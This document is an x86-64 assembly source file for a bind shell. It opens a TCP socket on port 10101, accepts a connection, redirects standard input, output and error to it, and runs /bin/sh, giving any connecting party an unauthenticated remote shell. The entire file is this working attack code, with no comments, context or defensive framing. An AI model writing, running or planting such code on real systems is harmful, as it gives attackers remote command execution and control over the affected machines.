.include "defs.h"

.section .bss
sin:
        sin_family: .word 0
        sin_port: .word 0
        sin_addr: .int 0

.section .data
        sock: .quad 0
        fd: .quad 0
        
.section .text
        bash: .ascii "//bin/sh"

.global _start
_start:

socket:
        xor %rax, %rax
        movq $SYS_SOCKET, %rax
        movq $AF_INET, %rdi
        movq $SOCK_STREAM, %rsi
        movq $IPPROTO_TCP, %rdx
        syscall

        movq %rax, sock

        movq $AF_INET, sin_family
        movw $10101, %ax
        xchgb %ah, %al
        movw %ax, sin_port

bind:
        movq $SYS_BIND, %rax
        movq sock, %rdi
        movq $sin, %rsi
        movq $0x10, %rdx
        syscall

listen:
        movq $SYS_LISTEN, %rax
        movq sock, %rdi
        movq $1, %rsi
        syscall

accept:
        movq $SYS_ACCEPT, %rax
        movq sock, %rdi
        xor %rsi, %rsi
        movq $0, %rdx
        syscall

        movq %rax, fd
dup2_1:
        movq $SYS_DUP2, %rax
        movq fd, %rdi
        movq $STDIN, %rsi
        syscall

dup2_2:
        movq $SYS_DUP2, %rax
        movq fd, %rdi
        movq $STDOUT, %rsi
        syscall

dup2_3:
        movq $SYS_DUP2, %rax
        movq fd, %rdi
        movq $STDERR, %rsi
        syscall

execve:
        xor %rax, %rax
        add $SYS_EXECVE, %rax

        xor %r9, %r9
        push %r9

        movq bash, %rbx
        push %rbx

        movq %rsp, %rdi

        push %r9
        movq %rsp, %rdx


        movq %rsp, %rsi
        syscall
